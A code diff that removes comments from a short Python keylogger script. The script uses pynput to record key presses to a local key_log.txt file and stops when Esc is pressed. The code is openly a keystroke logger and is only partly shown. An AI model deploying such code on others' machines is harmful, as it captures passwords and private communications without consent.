@@ -1,7 +1,6 @@
 from pynput import keyboard
 import os
 
-# Defina o caminho do arquivo de log como string raw
 log_file = os.path.expanduser(r"C:\Users\Isaac Aires\Downloads\key_log.txt")
 
 def log(message):
@@ -19,9 +18,7 @@ def on_press(key):
 def on_release(key):
     if key == keyboard.Key.esc:
         log("Listener stopped")
-        # Stop listener
         return False
 
-# Collect events until released
 with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
